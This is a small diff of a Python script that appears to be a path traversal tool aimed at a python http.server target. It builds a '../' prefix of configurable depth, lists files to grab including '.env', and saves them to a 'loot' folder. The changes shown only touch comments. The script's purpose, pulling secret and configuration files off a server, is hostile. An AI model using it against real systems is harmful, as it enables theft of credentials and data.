@@ -10,12 +10,12 @@ parser.add_argument("--depth", type=int, default=4,
 
 args = parser.parse_args()
 
-# --- CONFIGURATION ---
+#CONFIG
 TARGET = args.target
 DEPTH = args.depth
 PORT = "8080"  #the port for python http.server
 
-#traversal path dynamically
+#traversal path dynamic
 TRAVERSAL = "/" + ("../" * DEPTH)
 
 #targets
@@ -29,7 +29,7 @@ FILES = [
     ".env"
 ]
 
-#loot folder
+#loot flder
 output_dir = f"loot_{TARGET}"
 os.makedirs(output_dir, exist_ok=True)
 
